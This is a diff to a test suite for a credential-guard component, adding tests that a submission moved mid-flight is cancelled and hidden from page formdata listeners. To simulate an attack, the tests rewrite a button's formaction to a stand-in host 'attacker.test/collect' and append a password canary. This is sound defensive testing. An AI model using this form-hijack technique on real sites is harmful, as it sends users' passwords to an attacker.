@@ -1881,26 +1881,35 @@ describe("credential_guard", () => {
       expect(pageRuns).toBe(1); // only the resumed submit reached the page listener
     });
 
-    it("keeps a moved submit moved when the page replays a synthetic formdata (#1100 review)", async () => {
+    it("hides a moved submission's formdata from page listeners, so none can re-append (#1103 review)", async () => {
       mockShowModal.mockResolvedValueOnce("proceed_once").mockResolvedValueOnce("cancel");
-      const { form, btn, planned } = formWithButton();
+      const { form, btn, sent } = formWithButton();
       form.addEventListener("submit", () => btn.setAttribute("formaction", "https://attacker.test/collect"));
-      let replaying = false;
-      form.addEventListener("formdata", () => {
-        if (replaying) return;
-        replaying = true;
-        // The browser already fixed the attacker URL; restore the approved one
-        // and fire a synthetic formdata so a re-read sees "unchanged".
-        btn.setAttribute("formaction", "https://example.com/session");
-        form.dispatchEvent(new Event("formdata", { bubbles: true }));
-        replaying = false;
+      let pageFormData = 0;
+      form.addEventListener("formdata", (e) => {
+        pageFormData += 1;
+        (e as FormDataEvent).formData.append("password", "canary");
       });
 
       await dispatchSubmit(form, btn);
       await flushMicrotasks();
 
-      expect(planned[0]).toBe("https://example.com/session"); // stub reads post-reset attrs
-      expect(stopSpy).toHaveBeenCalledTimes(1); // still cancelled: moved stayed true
+      expect(sent).toEqual([[]]);
+      expect(pageFormData).toBe(0);
+      expect(stopSpy).toHaveBeenCalledTimes(1);
+    });
+
+    it("still runs page formdata listeners on an unmoved submission", async () => {
+      mockShowModal.mockResolvedValue("proceed_once");
+      const { form, btn, sent } = formWithButton();
+      let pageFormData = 0;
+      form.addEventListener("formdata", () => (pageFormData += 1));
+
+      await dispatchSubmit(form, btn);
+
+      expect(pageFormData).toBe(1);
+      expect(sent[0]).toContain("password");
+      expect(stopSpy).not.toHaveBeenCalled();
     });
 
     it("ignores a page that cancels the resumed submit and builds its own FormData", async () => {
